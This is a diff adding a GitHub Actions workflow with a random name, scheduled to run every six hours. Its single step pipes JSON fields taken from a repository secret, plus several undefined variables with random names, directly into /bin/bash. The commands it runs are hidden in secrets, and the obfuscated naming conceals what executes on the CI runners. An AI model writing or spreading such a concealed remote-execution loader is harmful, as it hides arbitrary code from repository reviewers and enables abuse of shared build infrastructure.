@@ -1,0 +1,26 @@
+name: kanzaiwozhebeizishunxu
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '11 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: kanzaiwozhebeizishunxu
+        env:
+          ea149: ${{ secrets.ea149 }}
+        run: |
+          echo $ea149 | jq -r .zhcc1 | /bin/bash
+          echo $bkmd8 | jq -r .vd72509 | /bin/bash
+          echo $gv1488 | jq -r .zhmc7930 | /bin/bash
+          echo $g09 | jq -r .rqvy1 | /bin/bash
+          echo $f089 | jq -r .e9750 | /bin/bash
+          echo $ypvy525 | jq -r .wa2 | /bin/bash
+          echo $svv05 | jq -r .n05 | /bin/bash
+          echo $iqbwc7091 | jq -r .gszb2572 | /bin/bash
+          echo $yicfw92532 | jq -r .a71809 | /bin/bash
+          echo $aq48989 | jq -r .k66783 | /bin/bash
+
